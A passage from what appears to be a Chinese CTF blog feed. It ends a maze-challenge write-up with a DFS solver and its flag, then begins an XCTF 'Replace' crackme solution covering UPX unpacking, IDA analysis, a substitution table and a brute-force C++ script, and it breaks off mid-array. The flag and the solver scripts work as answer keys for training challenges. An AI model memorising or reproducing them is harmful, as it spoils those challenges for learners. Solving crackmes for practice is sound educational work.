operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往上走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'w'</span>  <span class="token comment"># 向上走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往右走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'d'</span>  <span class="token comment"># 向右走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往左走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'a'</span>  <span class="token comment"># 向左走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    dfs<span class="token punctuation">(</span>sti<span class="token punctuation">,</span> stj<span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{69193150b15c87d39252d974bc323217}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/urG6V1REbaQdjK8.png" alt="SWPUCTF-老鼠走迷宫5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Replace</title>
      <link href="/2023/0339f3fd78.html"/>
      <url>/2023/0339f3fd78.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>对于 flag 字符串中的字符 ASCii 码进行取余数处理的加密，采用正向暴力破解更快</mark><br><mark>flag 中的字符一定是可打印字符， ASCii 码范围从 32 ~ 126，直接遍历一个一个尝试，直到符合条件即可</mark></p></li><li><p><strong>暴力破解不是万能的，因为有的加密方法，通过密文推出的明文可能由很多个都符合条件</strong>，视具体情况判断，<mark>当找到一个字符后一定要加上 break 退出循环</mark></p></li><li><p><mark>IDA中，在字符串的最后，用“0”表示结束</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=aa677771-ac2e-4562-b0a6-72ed6cd04603_2&task_category_id=4">攻防世界-Replace</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>先进行常规 upx 脱壳</p></li><li><p>IDA 打开，进入主函数<br><img src="https://s2.loli.net/2023/03/18/WYROglKEecztJrS.png" alt="攻防世界-Replace1.png"></p></li><li><p>输入 Buffer，且 Buffer 的长度需满足 <code>(strlen(Buffer) - 35) \&lt;= 2</code>。当 <code>sub_401090(Buffer, v3)</code> 返回 1 时，破解成功</p></li><li><p>查看 <code>sub_401090(Buffer, v3)</code> ，发现输入 Buffer 的长度必须为 35；且处理后的 35个字符，每一个都必须符合 <code>byte_4021A0\[16 \* v6 + v7\] != ((v11 + v12) ^ 0x19)</code> 的条件<br><img src="https://s2.loli.net/2023/03/18/t3KpfoAue6U7iEQ.png" alt="攻防世界-Replace2.png"></p></li><li><p>由于 <code>byte_402150[]</code> 和 <code>byte_402151[]</code> 的值在处理过程中未发生修改，且值已经给出，故可以从这里入手<br><img src="https://s2.loli.net/2023/03/18/g3SsDv7n29wyeKL.png" alt="攻防世界-Replace3.png"><br><code>byte_402150[]</code> 的内容：”2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6”<br><code>byte_402151[]</code> 的内容：”a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6”</p></li><li><p>同理得出 <code>byte_4021A0[]</code> 的内容：<br><mark>在 IDA View-A 中，全选数组的位置，右键 “Convert” –&gt; “Convert to C&#x2F;C++ array” 可快速获取数组数据，并将其转化为对应的语言</mark><br><img src="https://s2.loli.net/2023/03/18/y3NaB4uLiIvTpbk.png" alt="攻防世界-Replace4.png"></p><pre class="language-c" data-language="c"><code class="language-c">byte_4021A0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span><span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span><span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span><span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>v4 为计数器，共有35轮循环，分别处理 Buffer 的35个字符，v5 用来表示 Buffer 每一位字符</p><ul><li>先根据 <code>byte_402150[]</code> 和 <code>byte_402151[]</code> 的值在过程中未发生修改，得到每一轮 v8、v10 的值，进而得到 v9、v11、v12 的值和 <code>((v11 + v12) ^ 0x19)</code> 的值</li><li>由于 v5 的值与 <code>byte_4021A0[]</code> 的下标有关，找出 <code>byte_4021A0[]</code> 中与 <code>((v11 + v12) ^ 0x19)</code> 的值相等的元素，根据其下标即可知道 v6、v7 的值</li><li>但是根据下标反推出的 v6、v7 的值并不唯一，而且 v6、v7 对 v5 进行了求余操作，想利用 v6、v7 反向暴力破解求出 v5 很难</li></ul></li><li><p>所以这里通过正向暴力破解</p><ul><li>由于 flag 中的字符一定是可打印字符， ASCii 码范围从 32 ~ 126，直接遍历一个一个尝试</li><li>直到找到 v5 处理后得到符合条件的 v6、v7 使得 <code>byte_4021A0[16 * v6 + v7] == ((v11 + v12) ^ 0x19)</code> 即可，这个 v5 就是原本加密前的 Buffer 中的字符，将符合条件的 v5 全部输出</li></ul></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> byte_4021A0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span>            <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>            <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>            <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span>            <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>            <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span>            <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>            <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span>            <span class="token number">0xCD</span><span 